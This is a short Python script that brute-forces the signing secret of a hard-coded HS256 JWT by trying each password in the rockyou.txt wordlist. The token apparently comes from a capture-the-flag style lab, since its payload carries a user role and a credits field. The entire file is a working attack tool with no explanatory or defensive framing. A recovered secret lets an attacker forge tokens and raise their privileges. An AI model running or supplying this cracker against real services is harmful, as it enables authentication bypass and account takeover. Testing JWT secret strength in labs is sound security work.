import warnings
import jwt

warnings.simplefilter("ignore")

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHRyeWhlYXJ0bWUuY29tIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3OTE3NjM1MjksInRoZW1lIjoidmFsZW50aW5lIn0.YPtz0tdv3DjFcqmuz8-eh56n0Ql_vqQZ0A7Xkd4NcCU"
wordlist_path = "/home/codespace/wordlists/rockyou.txt"

found = False
print("[*] Starting brute-force attack against JWT...")
with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        secret = line.strip()
        if not secret:
            continue
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"\n[+] Found secret key: {secret}")
            found = True
            break
        except jwt.InvalidSignatureError:
            pass

if not found:
    print("\n[-] Wordlist exhausted without a match.")
